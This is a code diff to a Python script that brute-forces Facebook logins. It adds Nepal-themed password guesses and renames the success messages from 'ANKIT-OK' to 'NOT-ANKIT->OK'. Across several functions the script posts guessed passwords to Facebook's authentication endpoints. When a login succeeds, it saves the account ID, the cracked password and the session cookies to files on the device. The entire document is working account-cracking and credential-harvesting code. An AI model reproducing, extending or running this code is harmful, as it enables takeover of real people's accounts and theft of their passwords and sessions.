@@ -1171,13 +1171,25 @@ def menu():
                                         plist.append('firstlast')
                                         plist.append('firstlast123')
                                         plist.append('firstlast12345')
+                                        plist.append('firstlast@12345')
+                                        plist.append('kathmandu')
                                         plist.append('last@123')
                                         plist.append('maya123')      
                                         plist.append('maya12345')   
                                         plist.append('nepal@123')  
                                         plist.append('i love you')          
                                         plist.append('nepal@12345')       
-                                        plist.append('first last')                  
+                                        plist.append('first last') 
+                                        plist.append('First@123')  
+                                        plist.append('First@1234')   
+                                        plist.append('Firstlast')  
+                                        plist.append('first123456') 
+                                        plist.append('first111') 
+                                        plist.append('@first@')
+                                        plist.append('@first') 
+                                        plist.append('first123@@$')
+                                        plist.append('first@@') 
+                                        plist.append('first00')      
                                 else:
                                         try:
                                                 clear()
@@ -1470,12 +1482,12 @@ def api1(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("Cookie: "+coki)
                                        #print("\033[1;32mChecking active and expired apps...\033[0m
                                         open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/NOT-ANKIT->OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
@@ -1546,11 +1558,11 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/NOT-ANKIT->OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
@@ -1667,7 +1679,7 @@ def api3(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
@@ -1791,11 +1803,11 @@ def ffb(ids,names,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'                
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+' | ' + joined(coki) + '\033[1;97m')
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+ids+' | '+pas+' | ' + joined(coki) + '\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/NOT-ANKIT->OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break                     
                         elif 'www.facebook.com' in po['error']['message']:
@@ -2148,7 +2160,7 @@ def ANKIT1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ANKIT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         open('/sdcard/ANKIT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
@@ -2229,7 +2241,7 @@ def ANKIT2(ids,passlist):
 			q = json.loads(po)
 			if 'session_key' in q:
 				udx = str(q['uid'])
-				print('\r\r\033[1;32m [ANKIT-OK] '+udx+' | '+pas+'\033[1;97m')
+				print('\r\r\033[1;32m [NOT-ANKIT->OK] '+udx+' | '+pas+'\033[1;97m')
 				open('/sdcard/ANKIT-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
@@ -2322,7 +2334,7 @@ def ANKIT3(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ANKIT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
                                         #open('/sdcard/ANKIT-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
@@ -2417,7 +2429,7 @@ def ANKIT4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ANKIT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
                                         open('/sdcard/ANKIT-COOKIE.txt','a').write(coki+'\n')
@@ -2512,7 +2524,7 @@ def ANKIT5(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [ANKIT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         open('/sdcard/ANKIT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
@@ -2580,7 +2592,7 @@ def ANKIT6(ids,passlist):
 					if 'checkpoint' in str(lo):
 						print('\r\r\033[1;34m [ANKIT-2F] '+uid+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [ANKIT-OK] '+uid+' | '+pas)
+						print(f'\r\x1b[1;32m [NOT-ANKIT->OK] '+uid+' | '+pas)
 						open('/sdcard/ANKIT-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
 						oks.append(uid)
 						break
@@ -2892,7 +2904,7 @@ def rndm1(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{B}❲{G}\033[1;32mANKIT-OK{B}❳{G}\033[1;32m '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{B}❲{G}\033[1;32mNOT-ANKIT->OK{B}❳{G}\033[1;32m '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print(f"\r\r{B}❲{G}\033[1;37mCOOKIE{B}❳>{A} "+coki)
                                         open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
@@ -2991,7 +3003,7 @@ def rndm2(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{B}❲{G}ANKIT-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{B}❲{G}NOT-ANKIT->OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                         open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
@@ -3090,7 +3102,7 @@ def rndm3(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{B}❲{G}ANKIT-OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{B}❲{G}NOT-ANKIT->OK{B}❳{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{B}❲{G}COOKIE{B}❳>{A} "+coki)
                                         open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
